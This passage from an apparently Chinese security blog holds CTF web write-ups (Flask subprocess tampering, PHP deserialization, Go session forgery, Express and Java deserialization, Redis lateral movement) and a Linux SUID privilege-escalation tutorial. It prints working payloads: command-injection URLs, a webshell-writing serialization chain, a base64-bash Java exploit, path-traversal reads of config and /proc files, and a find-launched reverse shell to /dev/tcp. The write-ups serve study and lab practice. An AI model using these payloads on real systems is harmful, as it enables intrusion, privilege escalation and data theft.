class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">gett</span>(obj,arg):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">arg</span>:</span><br><span class="line">        tmp = <span class="title function_">getattr</span>(tmp,i)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">def <span class="title function_">sett</span>(obj,arg,num):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="title function_">len</span>(arg)-<span class="number">1</span>):</span><br><span class="line">        tmp = <span class="title function_">getattr</span>(tmp,arg[i])</span><br><span class="line">    <span class="title function_">setattr</span>(tmp,arg[i+<span class="number">1</span>],num)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">hint</span>(giveme,num,bol):</span><br><span class="line">    c = <span class="title function_">gett</span>(subprocess,giveme)</span><br><span class="line">    tmp = <span class="title function_">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="title function_">tuple</span>(tmp)</span><br><span class="line">    <span class="title function_">sett</span>(subprocess,giveme,tmp)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(arg):</span><br><span class="line">    subprocess.<span class="title function_">call</span>(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">exec</span>():</span><br><span class="line">    <span class="attr">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;exec&#x27;</span>)==<span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            <span class="title function_">cmd</span>(shell)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            exp = <span class="title function_">list</span>(request.<span class="title function_">get_json</span>()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="title function_">int</span>(request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="title function_">bool</span>(request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            <span class="title function_">hint</span>(exp,num,bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="attr">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>原理：</p><p>当subprocess.call()函数第七个参数shell&#x3D;false则会直接执行命令而不通过shell环境调用</p><p>当shell&#x3D;true时 就会调用&#x2F;bin&#x2F;sh 来执行命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533430884-f3f1f5a4-22e2-45e8-941b-b3bc43192f67.png" alt="img"></p><p>subprocess.call()其实调用的是Popen()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533474760-aa96130f-7ade-4152-9926-fc7afe009013.png" alt="img"></p><p>我们跟进一下</p><p>可以看到默认shell&#x3D;false</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533542743-270a8adc-f50c-4bb3-b282-6144db8e74de.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533800870-0bb0adcb-5d03-4300-9797-77121fc4c848.png" alt="img"></p><p>值得注意的是进程被卡死在这里叫做死锁</p><p>如果我们执行命令只是单纯一句指令 那么无论是shell等于true还是false 都会执行 两者没有差别</p><p>加了参数那么shell&#x3D;false就无法执行了</p><p>因此这道题就应该先去修改subprocess.call()的第七个参数为true这样我们才能执行带有参数的命令</p><p>通过 setattr来修改属性值</p><p>setattr(a,b,c)：将a对象的第b个属性修改为vlaue&#x3D;c  </p><p>需要注意这里exp是json格式的<code>exp = list(request.get_json()[&#39;exp&#39;])</code></p><p>payload:<code>?exec=oka&amp;num=7&amp;bol=1</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__defaults__&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行通过将命令执行的结果写入文件来读取 但是这里不能进行反弹shell 不知道是什么原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=mkdir+./static;ls+/&gt;./static/a.txt&amp;exec=ok</span><br></pre></td></tr></table></figure><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="快问快答"><a href="#快问快答" class="headerlink" title="快问快答"></a>快问快答</h2><p>写脚本</p><h2 id="sseerriiaalliizzee（未解出）"><a href="#sseerriiaalliizzee（未解出）" class="headerlink" title="sseerriiaalliizzee（未解出）"></a>sseerriiaalliizzee（未解出）</h2><p>纯眼瞎</p><p>考点：</p><ul><li>exit死亡绕过</li></ul><p>pop链不难</p><p>那么这道题最大的坑点在于如何触发<code>__toString </code>其实是靠这里的echo语句触发（吐血）</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698741524834-753296b0-0c06-4261-b9ab-babb88c919f7.png" alt="img"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Start</span>&#123;</span><br><span class="line">    public $barking;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTF</span>&#123; </span><br><span class="line">    public $part1;</span><br><span class="line">    public $part2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line">$a-&gt;barking=<span class="keyword">new</span> <span class="title function_">CTF</span>();</span><br><span class="line">$a-&gt;barking-&gt;part1=<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=cmd.php&#x27;</span>;</span><br><span class="line">$a-&gt;barking-&gt;part2=<span class="string">&#x27;AA&#x27;</span>.<span class="title function_">base64_encode</span>(<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">echo <span class="title function_">urlencode</span>(<span class="title function_">serialize</span>($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是这里<code>+</code>也算是合法字符 所以要加两个任意字符AA来和<code>&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;</code>构成四个一组 </p><p>也即是 <code>AAphpdie+GenshinImpactStart+</code>总计为28 为4的整数倍</p><h2 id="gogogo（未解出）"><a href="#gogogo（未解出）" class="headerlink" title="gogogo（未解出）"></a>gogogo（未解出）</h2><p>主要源码看这个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">package route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;main/readfile&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.<span class="title class_">NewCookieStore</span>([]<span class="title function_">byte</span>(os.<span class="title class_">Getenv</span>(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line">func <span class="title class_">Index</span>(c *gin.<span class="property">Context</span>) &#123;</span><br><span class="line">session, err := store.<span class="title class_">Get</span>(c.<span class="property">Request</span>, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">http.<span class="title class_">Error</span>(c.<span class="property">Writer</span>, err.<span class="title class_">Error</span>(), http.<span class="property">StatusInternalServerError</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.<span class="property">Values</span>[<span class="string">&quot;name&quot;</span>] == nil &#123;</span><br><span class="line">session.<span class="property">Values</span>[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;User&quot;</span></span><br><span class="line">err = session.<span class="title class_">Save</span>(c.<span class="property">Request</span>, c.<span class="property">Writer</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">http.<span class="title class_">Error</span>(c.<span class="property">Writer</span>, err.<span class="title class_">Error</span>(), http.<span class="property">StatusInternalServerError</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.<span class="title class_">String</span>(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="title class_">Readflag</span>(c *gin.<span class="property">Context</span>) &#123;</span><br><span class="line">session, err := store.<span class="title class_">Get</span>(c.<span class="property">Request</span>, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">http.<span class="title class_">Error</span>(c.<span class="property">Writer</span>, err.<span class="title class_">Error</span>(), http.<span class="property">StatusInternalServerError</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.<span class="property">Values</span>[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.<span class="title class_">String</span>(<span class="number">200</span>, <span class="string">&quot;Congratulation! You are admin,But how to get flag?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">path := c.<span class="title class_">Query</span>(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line"></span><br><span class="line">reg := regexp.<span class="title class_">MustCompile</span>(<span class="string">`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reg.<span class="title class_">MatchString</span>(path) &#123;</span><br><span class="line"></span><br><span class="line">http.<span class="title class_">Error</span>(c.<span class="property">Writer</span>, <span class="string">&quot;nonono&quot;</span>, http.<span class="property">StatusInternalServerError</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data []byte</span><br><span class="line"><span class="keyword">if</span> path != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">data = readfile.<span class="title class_">ReadFile</span>(path)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">data = []<span class="title function_">byte</span>(<span class="string">&quot;请传入参数&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.<span class="title class_">JSON</span>(<span class="number">200</span>, gin.<span class="property">H</span>&#123;</span><br><span class="line"><span class="string">&quot;success&quot;</span>: <span class="string">&quot;read: &quot;</span> + <span class="title function_">string</span>(data),</span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.<span class="title class_">String</span>(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看题目也知道是个go题目</p><p>首先就是伪造admin身份 根据源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745810102-34237fe9-659c-41d9-8498-8c6c637258ad.png" alt="img"></p><p>session的key从环境变量中去获取的 盲猜为空 就像国赛那到题目一样 然后本地起一个环境</p><p>首先在go.mod引入依赖 然后启动</p><p>稍稍修改源码 使得我们session的身份为admin</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745974982-7f9ac75d-f37d-4359-a5c2-d674dac2f84e.png" alt="img"></p><p>去获取session 然后打入题目</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745913115-965ef058-cf6f-45d0-94cf-ef858b8a06dd.png" alt="img"></p><p>然后是&#x2F;readflag路由 去读文件 要绕过一个正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\[\]]`)</span><br></pre></td></tr></table></figure><p>可见还有一个字符a没有过滤 直接利用通配符 </p><p>payload：<code>/readflag?filename=/??a?</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698746089781-649d5278-6829-4ed4-8c45-56c3e1bd5e5d.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023“网信柏鹭杯”大学生网络空间安全精英赛 WEB WP与复现</title>
      <link href="/post/37ed1ed6.html"/>
      <url>/post/37ed1ed6.html</url>
      
        <content type="html"><![CDATA[<p>web </p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="express-fs"><a href="#express-fs" class="headerlink" title="express fs"></a>express fs</h2><p>看url是个nodejs文件读取的题目</p><p>发现是原题<a href="https://cloud.tencent.com/developer/article/2123023">https://cloud.tencent.com/developer/article/2123023</a></p><p>payload:</p><p>ban了flag字样 对其双url编码即可绕过  </p><p>因为Express 已经 URL 解码一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file[href]=a&amp;file[origin]=1&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=/fl%2561g.txt</span><br></pre></td></tr></table></figure><h2 id="综合题五"><a href="#综合题五" class="headerlink" title="综合题五"></a>综合题五</h2><p>有一个文件上传的点 但是这道题没用</p><p>然后观察读取上传的文件url发现存在任意文件读取</p><p>查看一下当前进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readfile?filename=../../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p>发现&#x2F;app目录下有jar包 就想读下来</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697181098715-b040db41-6a76-4e11-8f2b-66667ea5efaa.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readfile?filename=../../../../../../app/demo.jar</span><br></pre></td></tr></table></figure><p>当时比赛环境它有问题 我根本下载不下来 一直在转圈 </p><p>复现发现是过了那个bp代理就下不下来 得去掉才行</p><p>得到源码 很明显o0o函数在做一个异或操作或者调教gpt也能知道</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182071732-2fb2892b-27e0-4309-9420-7c4ec6b1d0ff.png" alt="img"></p><p>直接用大头师傅的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">key = b<span class="string">&#x27;6925cc02789c1d2552b71acc4a2d48fd&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&#x27;</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">print(enc)</span><br><span class="line"># key = bytes.fromhex(key)</span><br><span class="line">flag = xor(key,enc)</span><br><span class="line">print(flag)</span><br><span class="line"># flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></pre></td></tr></table></figure><h2 id="综合题六"><a href="#综合题六" class="headerlink" title="综合题六"></a>综合题六</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182444787-3fbf102c-d17d-4576-a2c6-fb57bf8a1134.png" alt="img"></p><p>重写readObject 并且有一个恶意类 还能执行命令函数 很明显一个java反序列化利用</p><p>在这个路由下利用</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697184231819-d32a28fd-652a-4970-8d52-3083a7d92892.png" alt="img"></p><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Ping</span> <span class="variable">ping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ping</span>();</span><br><span class="line">        ping.setCommand(<span class="string">&quot;bash&quot;</span>);</span><br><span class="line">        ping.setArg1(<span class="string">&quot;-i&quot;</span>);</span><br><span class="line">        <span class="comment">//和ysoserial命令利用方式一样</span></span><br><span class="line">        ping.setArg2(<span class="string">&quot;&#123;echo,命令base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(ping);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="综合题七"><a href="#综合题七" class="headerlink" title="综合题七"></a>综合题七</h2><p>经过综合题六到内网 有一个redis并且22端口开放 就是redis写ssh公钥的 没环境大致和那个moectf内网渗透题目一模一样</p><p>先从内网中读到redis密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/readfile?filename=../../../../../../../usr/local/share/application.properties</span><br><span class="line">server.port=18080</span><br><span class="line">server.servlet.context-path=/</span><br><span class="line">management.endpoints.web.exposure.include=heapdump</span><br><span class="line">spring.redis.host=172.25.0.10</span><br><span class="line">spring.redis.port=62341</span><br><span class="line">spring.redis.password=de17cb1cfa1a8e8011f027b416775c6a</span><br><span class="line">spring.servlet.multipart.max-file-size=10MB</span><br></pre></td></tr></table></figure><p>之后流程可参考<a href="https://www.cnblogs.com/-qing-/p/10978912.html">Redis未授权访问写Webshell和公私钥认证获取root权限 - 卿先生 - 博客园</a></p><h2 id="还有三个题均为0解"><a href="#还有三个题均为0解" class="headerlink" title="还有三个题均为0解"></a>还有三个题均为0解</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux suid提权</title>
      <link href="/post/51218ec8.html"/>
      <url>/post/51218ec8.html</url>
      
        <content type="html"><![CDATA[<p>Linux suid提权</p><span id="more"></span><h1 id="what"><a href="#what" class="headerlink" title="what"></a>what</h1><p>SUID（Set User ID）是一种 Unix 和类 Unix 操作系统中的权限位，用于改变执行文件的权限。当一个可执行文件被设置为 SUID，它在执行时将具有文件所有者的权限，而不是执行者的权限。</p><p>简单说：如果一个文件具有s权限，那么当我们执行它时，不是以用户身份执行，而是以文件所有者身份执行，因而具有文件所有者的权限</p><p>这可以用于在执行过程中获取特权，例如允许普通用户执行需要超级用户权限的操作，而无需登录超级用户账户</p><blockquote><p>linux引入了3个文件来管理用户组：</p><ol><li>&#x2F;etc&#x2F;passwd存放用户信息。</li><li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li><li>&#x2F;etc&#x2F;group存放组信息。</li></ol><p>在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。</p><p>用户信息&#x2F;etc&#x2F;passwd每行共有7个字段冒号隔开：</p><p>字段1为用户名。</p><p>字段2为用户的密码。</p><p>字段3为指UID，每个用户都有自己的uid。</p><p>字段4为组UID，每个用户都有不同的uid。</p><p>字段5为解释说明的字段。</p><p>字段6为指用户的根目录。</p><p>字段7为指登录shell，用户登录shell，当前为&#x2F;bin&#x2F;zsh表示可以登录，&#x2F;sbin&#x2F;nologin标识不被授权登录。</p></blockquote><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695300429889-ce892384-256a-4a3c-bb27-42fea2f16dfc.png" alt="img"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>可以看到只有root的uid为0 如果把一个普通用户的uid修改为0，那么只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0</p><p>当我们在linux创建文件时，非root用户是无法创建的，除非让root用户为我们提升权限或者用sudo命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301362482-ee8ac428-a058-455a-b3e8-1720e6d35d1b.png" alt="img"></p><p>并且此时创建的文件的所属人所属组也是root 并不是我们自己</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301465468-3823df3f-d3de-4b4d-9846-9427efb82035.png" alt="img"></p><p>因此 如果这个文件带有suid 那么当我们执行的时候就会以root权限进行执行，可执行文件运行时该进程的权限为root权限 从而提升权限</p><h1 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301658898-a848291a-5c20-413c-9a21-04496ec48d23.png" alt="img"></p><h1 id="如何查找suid文件"><a href="#如何查找suid文件" class="headerlink" title="如何查找suid文件"></a>如何查找suid文件</h1><p>常用的几条：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h1 id="利用suid进行提权"><a href="#利用suid进行提权" class="headerlink" title="利用suid进行提权"></a>利用suid进行提权</h1><h2 id="一些小思考"><a href="#一些小思考" class="headerlink" title="一些小思考"></a>一些小思考</h2><p>以下有些命令说是提权但是只是进入一个shell交互界面 但是用户还是非root状态 </p><p>网上好多文章也只是止步于此 并没有解释的清楚</p><p>当然也并不能说它提权失败了</p><p>提权不是说一定要提升到root用户 只要能达到<strong>越权</strong>效果<strong>，</strong>那么也算是狭义的提权了</p><p>具体效果还要根据题目或者真实环境而已，但是能进入shell界面总归是一个好的开始</p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>以下命令都是基于自身已经被赋予了suid</p><p>例如这里的find命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302463326-c4705fe8-a5a3-4014-87c3-0a4ecdda6fe9.png" alt="img"></p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>不过一般在实战中都是在&#x2F;tmp下创建一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find 任意文件filename -exec whoami \; -quit</span><br><span class="line">find 任意文件filename -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302590191-1c53604d-2262-48c5-bda1-9ae0f0a0b135.png" alt="img"></p><p>网上还有利用这个find命令进行反弹shell提权的，但是反弹shell并没有提权，还是非root用户</p><p>还是说我kali版本太高了被修复了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 1.txt -exec bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27; \; -quit</span><br></pre></td></tr></table></figure><p><img 